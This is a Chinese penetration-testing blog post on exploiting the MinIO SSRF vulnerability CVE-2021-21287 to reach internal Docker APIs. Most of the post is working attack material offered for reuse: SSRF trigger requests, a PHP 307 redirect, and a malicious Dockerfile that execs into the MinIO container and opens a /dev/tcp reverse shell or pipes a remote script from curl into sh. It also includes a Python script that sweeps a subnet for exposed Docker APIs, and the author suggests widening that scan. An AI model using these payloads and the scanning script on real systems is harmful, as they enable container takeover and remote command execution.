---
title: Minio-ssrf盲打
date: 2023-07-14 14:45:47
categories: 渗透测试
tags: SSRF
---

**文章首发于火线安全**

地址[https://zone.huoxian.cn/d/2801-minio-ssrf-docker-api](https://zone.huoxian.cn/d/2801-minio-ssrf-docker-api)

## 前言

Minio SSRF漏洞-**CVE-2021-21287**，由于MinIO组件中LoginSTS接口设计不当，导致存在服务器端请求伪造漏洞。

<!--more-->

但这个漏洞没有回显，利用起来也比较麻烦，目前已知的利用方式是用重定向去打docker api和内网的其他服务。

在不知道docker集群地址的情况下，也只能通过盲打的方式去碰运气了。

## 漏洞复现

### 漏洞验证

服务器开启NC监听

`sudo nc -lvp 80`

发送如下数据包，将**HOST**头修改为服务器地址

```http
POST /minio/webrpc HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Content-Type: application/json
Content-Length: 76

{"id":1,"jsonrpc":"2.0","params":{"token":"Test"},"method":"web.LoginSTS"}
```

若NC有反应，则漏洞存在

### 漏洞利用

这个漏洞利用主要通过307的可控路径重定向让目标去请求指定服务

可以先来尝试一下，编辑index.php，输入以下内容

```php
<?php
header('Location: http://192.168.203.130:8080', false, 307);
```

开启一个简单的http服务

`php -S 0.0.0.0:80`

我们让其重定向去访问 http://192.168.203.130:8080

在192.168.203.130的8080端口启动NC监听

`sudo nc -lvp 8080`

发送数据包

```http
POST /minio/webrpc HTTP/1.1
Host: 192.168.203.130
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Content-Type: application/json
Content-Length: 76

{"id":1,"jsonrpc":"2.0","params":{"token":"Test"},"method":"web.LoginSTS"}
```

![Snipaste_2023-05-14_23-07-35](https://cdn.laohuan.art/Snipaste_2023-05-14_23-07-35.png)

可以看到我们的8080端口确实收到了请求

利用过程如图

![minio](https://cdn.laohuan.art/minio.png)

这里黑客指定地址如上面的代码，也就是http://192.168.203.130:8080，假如我们把这个地址换为其他地址呢，比如docker api或者内网其他服务的地址。

现在尝试攻击docker api的2375端口

在黑客服务器上编辑index.php文件,内容如下

`<?php
header('Location: http://192.168.203.130:2375/build?remote=http://192.168.203.130/Dockerfile&nocache=true&t=evil:1', false, 307);`

这里的两个地址需要做一个说明，我这里为了方便在一台机子上做的测试，在实际环境中地址不同。

* http://192.168.203.130:2375/build  docker api的地址
* remote=http://192.168.203.130/Dockerfile  黑客服务器的地址

编辑Dockerfile文件，内容如下

```bash
FROM alpine:3.13

RUN apk add curl bash jq

RUN set -ex && \
{ \
	echo '#!/bin/bash'; \
	echo 'set -ex'; \
	echo 'target="http://192.168.203.130:2375"'; \
	echo 'jsons=$(curl -s -XGET "${target}/containers/json" | jq -r ".[] | @base64")'; \
	echo 'for item in ${jsons[@]}; do'; \
	echo '    name=$(echo $item | base64 -d | jq -r ".Image")'; \
	echo '    if [[ "$name" == *"minio/minio"* ]]; then'; \
	echo '        id=$(echo $item | base64 -d | jq -r ".Id")'; \
	echo '        break'; \
	echo '    fi'; \
	echo 'done'; \
	echo 'execid=$(curl -s -X POST "${target}/containers/${id}/exec" -H "Content-Type: application/json" --data-binary "{\"Cmd\": [\"bash\", \"-c\", \"bash -i >& /dev/tcp/192.168.203.130/8080 0>&1\"]}" | jq -r ".Id")'; \
	echo 'curl -s -X POST "${target}/exec/${execid}/start" -H "Content-Type: application/json" --data-binary "{}"'; \
} | bash
```

其中target为 docker api的地址，execid下的反弹shell要修改为自己服务器监听地址

我们在自己的服务器开启简单php服务和nc监听

`sudo php -S 0.0.0.0:80`

`sudo nc -lvp 8080`

再次发送数据包

```http
POST /minio/webrpc HTTP/1.1
Host: x.x.x.x #黑客地址
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36
Content-Type: application/json
Content-Length: 76

{"id":1,"jsonrpc":"2.0","params":{"token":"Test"},"method":"web.LoginSTS"}
```

![Snipaste_2023-05-14_23-11-36](https://cdn.laohuan.art/Snipaste_2023-05-14_23-11-36-1684572404927-7.png)

可以看到，已经成功的请求了我们的恶意dockerfile文件，并获得了一个shell



## 自动化盲打

那么问题来了，这里作为测试我们知道docker api的地址为192.168.203.130，在实际环境中我们是不知道docker集群的api地址的，甚至连有没有docker集群都不一定，这个时候就只能盲打碰碰运气了

难点在于要利用这个漏洞不断地向我们的服务器获取重定向的地址，服务器端要不断的刷新这个重定向的地址。

为此写了一个简单的盲打脚本

```php
import os
import ipaddress
import re
import requests
import time

server = "192.168.203.130"  #  Nc监听服务器地址
ip_icdr = "192.168.203.0/24" # 要爆破的c段

def replace_ip(file,ip):
    with open(file,'r',encoding='utf8') as f:
        content = f.read()

    ip_regex = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
    ip_addresses = re.findall(ip_regex, content)
    for i in ip_addresses:
        if i != server:
            content = content.replace(i,ip)

    with open(file,'w') as f:
        f.write(content)

def replace(old,new):
	old_ip  = old+':2375'
	new_ip = new+':2375'
	cmd = 'sed -i "s/{0}/{1}/g" index.php'.format(old_ip,new_ip)
	cmd2 = 'sed -i "s/{0}/{1}/g" Dockerfile'.format(old_ip,new_ip)
	os.system(cmd)
	os.system(cmd2)

def url_send(ip):
	url="http://192.168.203.130:9000" #目标服务器地址
#	proxies={'http':'http://192.168.1.5:8089'}
	headers = {
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
	'Host': server,
	'Content-Type': 'application/json'}
	url = url+"/minio/webrpc"
	data = """{"id":1,"jsonrpc":"2.0","params":{"token":"Test"},"method":"web.LoginSTS"}"""

	response = requests.post(url, headers=headers, data=data,timeout=10) 
	print("try "+url+  "   >>  " + str(response.status_code)+"   >>    "+ip)


def main():
	ip = []
	ip_network = ipaddress.ip_network(ip_icdr)
	for i in ip_network:
		ip.append(i)
	replace_ip('index.php',str(ip[1]))
	replace_ip('Dockerfile',str(ip[1]))
	url_send(str(ip[1]))
	for i in range(2,len(ip)):
		replace(str(ip[i-1]),str(ip[i]))
#		print(str(ip[i-1])+">>" + str(ip[i]))
		url_send(str(ip[i]))


		
if __name__ ==  "__main__":
	main()

```

1. 将给脚本放到服务器上，在当前目录还需要另外两个文件

* Dockerfile
* index.php

index.php的文件内容

```php
<?php
header('Location: http://192.168.203.130:2375/build?remote=http://192.168.203.130/Dockerfile&nocache=true&t=evil:1', false, 307);

```

注意修改remote地址为自己服务器的地址

2. Dockfile文件内容

   ```bash
   FROM alpine:3.13
   
   RUN apk add curl bash jq
   
   RUN set -ex && \
   { \
   	echo '#!/bin/bash'; \
   	echo 'set -ex'; \
   	echo 'target="http://192.168.203.143:2375"'; \
   	echo 'jsons=$(curl -s -XGET "${target}/containers/json" | jq -r ".[] | @base64")'; \
   	echo 'for item in ${jsons[@]}; do'; \
   	echo '    name=$(echo $item | base64 -d | jq -r ".Image")'; \
   	echo '    if [[ "$name" == *"minio/minio"* ]]; then'; \
   	echo '        id=$(echo $item | base64 -d | jq -r ".Id")'; \
   	echo '        break'; \
   	echo '    fi'; \
   	echo 'done'; \
   	echo 'execid=$(curl -s -X POST "${target}/containers/${id}/exec" -H "Content-Type: application/json" --data-binary "{\"Cmd\": [\"bash\", \"-c\", \"curl http://192.168.203.143:13338 | sh\"]}" | jq -r ".Id")'; \
   	echo 'curl -s -X POST "${target}/exec/${execid}/start" -H "Content-Type: application/json" --data-binary "{}"'; \
   } | bash
   ```

   注意修改这串命令`curl http://192.168.203.143:13338 | sh`

   这里可以使用nc的反弹命令，但nc长时间监听被别人扫描会有一些花里胡哨的东西，且nc只能管理单个shell，这里我用了一款shell管理器 [platypus](https://platypus-reverse-shell.vercel.app/)

   启动 platypus,便会生成链接地址

   `./platypus_linux_amd64`

![image-20230520171912576](https://cdn.laohuan.art/image-20230520171912576.png)

将生成的命令替换为dockerfile的命令即可

3. 修改脚本相关注释内容即可

   ![image-20230520172114318](https://cdn.laohuan.art/image-20230520172114318.png)

我只设置了爆破c段，我觉得挑几个常见的c段爆破一下碰下运气就行了，没必要弄那么大的动静把内网来一遍

![image-20230520172310029](https://cdn.laohuan.art/image-20230520172310029.png)

确保这个目录下存在这三个文件，开启相关服务就可以直接运行脚本了

![image-20230520172439983](https://cdn.laohuan.art/image-20230520172439983.png)

`php -S 0.0.0.0:80`

`python3 minio.py`

![Snipaste_2023-05-14_22-08-01](https://cdn.laohuan.art/Snipaste_2023-05-14_22-08-01.png)

可以看到目标最终请求了我们的Dockerfile文件

platypu也成功获得了一个shell

![Snipaste_2023-05-14_22-07-26](https://cdn.laohuan.art/Snipaste_2023-05-14_22-07-26.png)

**演示视频**

<iframe width="500" height="315" src="https://www.youtube.com/embed/wxZJwQP94ro" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen></iframe>

## 总结

当然也不只局限于用来打docker api，也可以利用常规的ssrf利用手段来盲打其他服务，改下脚本就行，另外我也只写了爆破c段，盲打这种东西本来就是靠运气的，大家也可以改改脚本来爆破b段。

参考文献

* [https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html](https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html)
* [https://mp.weixin.qq.com/s/0PbCSy83Sfozqq2-aUaAew](https://mp.weixin.qq.com/s/0PbCSy83Sfozqq2-aUaAew)

